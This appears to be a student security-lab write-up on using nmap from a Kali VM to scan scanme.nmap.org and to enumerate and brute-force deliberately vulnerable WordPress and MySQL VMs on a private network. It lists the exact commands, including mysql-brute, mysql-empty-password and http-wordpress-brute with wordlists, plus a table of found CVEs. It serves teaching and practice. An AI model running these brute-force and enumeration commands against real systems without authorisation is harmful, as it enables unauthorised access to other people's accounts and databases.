## Summary:
Vulnerability analysis to Wordpress and MySQL VMs using nmap

## Description
This lab consists of a Wordpress VM, a MySQL VM, both vulnerable, and a Kali VM connected through a NAT network. I wrote a shell script that scans both the _scanme.nmap.org_ site and the local network, and that also exploits vulnerabilities in the Wordpress and MySQL VMs to demonstrate the power of nmap scripts.

Result of the lab:

| IP | Operating system | Ports| Services | Service/OS Versions | CVE vulns | Vulns from the tests |
| -- | ---------------- | ---- | -------- | ------------------- | --------- | -------------------- |
| 45.33.32.156 | Linux | 22, 25, 80, 9929, 31337 | SSH, SMTP, HTTP, nping-echo, tcpwrapped | Linux 2.6.32, OpenSSH 6.6.1p1, Apache httpd 2.4.7, Nping echo |   |   |
| 10.10.0.8 | Linux  | 80, 443, 3306 | HTTP, HTTPS, MySQL | Linux 2.4.X, Apache httpd 1.3.28, MySQL 4.1.7-standard| CVE-2012-3177, CVE-2009-2446, CVE-2006-2753 | mysql-brute, mysql-enum, mysql-empty-password |
| 10.10.0.9 | Linux | 22, 80, 443 | SSH, HTTP, HTTPS | OpenSSH 7.9p1, Apache httpd | CVE-2015-9357  | http-wordpress-enum, http-wordpress-users, http-wordpress-brute |

## Steps To Reproduce:

  1. In VirtualBox create a new NAT network named _CompletelySecureNATNetwork_
     1. Give it the subnet _10.10.0.0/24_
     2. Enable DHCP
  1. Download the Kali OVA from the **Supporting Material**
     1. Import it to VirtualBox
     2. Change the bridge adapter to work on your computer, since it was configured to work with the interfaces of my computer. Just make sure you select some interface of your computer
  2. Dowload the Wordpress OVA and the MySQL OVA from the **Supporting Material** and import them to VirtualBox
  3. Download the ISO given in the **Supporting Material** and add it to the MySQL VM
  4. Turn on all three VMs (Wordpress, MySQL and Kali)
  5. Acces the Kali VM with:
     1. User = kali
     2. Password = kali
  6. Open a terminal and run the **script_nmap.sh** with root privileges using:
     1. `sudo ./script_nmap.sh`
  7. The **script_nmap.sh** does the following:
     1. Opens a xterm terminal and makes a nmap scan using a broadcast ping, through the eth1 interface, in search of the OS, open ports and their versions of _scanme.nmap.org_
        1. `xterm -hold -title "Ports, version, OS and broadcast ping of scanme.nmap.org" -e "nmap scanme.nmap.org -O -Pn -sV -e eth1"`
     2. Opens a xterm terminal and makes a nmap scan to detect if the DNS port of _scanme.nmap.org_ is open
        1. `xterm -hold -title "DNS information of scanme.nmap.org" -e "nmap scanme.nmap.org -p 53 -e eth1"`
     3. Opens a xterm terminal and performs an ACK scan with nmap to check which ports are filtered by a firewall
        1. `xterm -hold -title "Possible firewall of scanme.nmap.org" -e "nmap scanme.nmap.org -sA -e eth1"`
     4. Opens a xterm terminal and uses the _broadcast-ping_ script from nmap with the NAT network to find all the hosts and IPs connected to it
        1. `xterm -hold -title "Host discovery of the network through ping" -e "nmap 10.10.0.0/24 --script broadcast-ping"`
     5. Opens a xterm terminal and scans for the open ports and their versions of all the hosts of the NAT network
        1. `xterm -hold -title "Open ports and version of every host" -e "nmap 10.10.0.0/24 -sV"`
     6. Reads the input from the user (the IP from the Wordpress VM) and stores it in WP_IP
        1. `read -p "Type in the IP of the host with http and https ports open: " WP_IP`
     7. Reads the input from the user (the IP from the MySQL VM) and stores it in SQL_IP
        1. `read -p "Type in the IP of the host with mysql port open: " SQL_IP`
     8. Opens a xterm terminal and scans for the operating system of the hosts of the NAT network
        1. `xterm -hold -title "OS of the hosts" -e "nmap 10.10.0.0/24 -O"`
     9. Opens a xterm terminal and uses the _mysql-brute_ script from nmap to attack the MySQL VM
        1. `xterm -hold -title "Brute force to MySQL" -e "nmap $SQL_IP -p 3306 --script mysql-brute"`
     10. Opens a xterm terminal and uses the _mysql-empty-passwords_ and the _mysql-enum_ scripts from nmap to show insecure configurations such as users with empty passwords from the MySQL VM
        1. `xterm -hold -title "Insecure config in MySQL" -e "nmap $SQL_IP -p 3306 --script mysql-empty-password,mysql-enum"`
     11. Opens a xterm terminal and uses the _http-wordpress-enum_ script from nmap to list the installed plugins of the Wordpress VM
        1. `xterm -hold -title "Wordpress plugins" -e "nmap $WP_IP -p 80,443 --script http-wordpress-enum"`
     12. Opens a xterm terminal and uses the _http-wordpress-users_ script from nmap to list the users from the Wordpress VM
       1. `xterm -hold -title "List of Wordpress users" -e "nmap $WP_IP -p 80,443 --script http-wordpress-users"`
     13. Opens a xterm terminal and uses the _http-wordpress-brute_ script from nmap with the _admin.txt_ and the _common_pass.txt_ wordlists to brute force the admin from the Wordpress VM
       1. `xterm -hold -title "Brute force to Wordpress admin" -e "nmap $WP_IP -p 80,443 --script http-wordpress-brute --script-args userdb=admin.txt,passdb=/usr/share/wordlists/wfuzz/others/common_pass.txt"`
  8. If one of the scans doesn't end please close all windows and run the script again
     1. `sudo ./script_nmap.sh`
  9. The images of the vulnerability results of the test can be found in the **Supporting Material**

## Supporting Material/References:
[Link to nmap scripts](https://nmap.org/nsedoc/index.html)<br />
[Kali, Wordpress and MySQL OVA](https://iteso01-my.sharepoint.com/:f:/g/personal/si721687_iteso_mx/Esik5qfT7OtFhB9ixrt5j3gBmo6POSommeUWwASTNywDPw?e=g23bUI)<br />
[ISO](https://iteso01-my.sharepoint.com/:u:/g/personal/si721687_iteso_mx/EfFqB6z-GaBHqPloRro7khwBqdVgkrjtuQj7eALHPrD33w?e=b4gkaQ)<br />
[script_nmap.sh script](https://raw.githubusercontent.com/Alex-Sandoval12/Vulnerability-analysis-with-nmap/master/script_nmap.sh)<br />
[Vulnerability result images](https://iteso01-my.sharepoint.com/:f:/g/personal/si721687_iteso_mx/Et7-eiEdGY5Pkz3h4vujRHQB3PpwtlaRhG4uwniOA7me1w?e=QMPgBm)
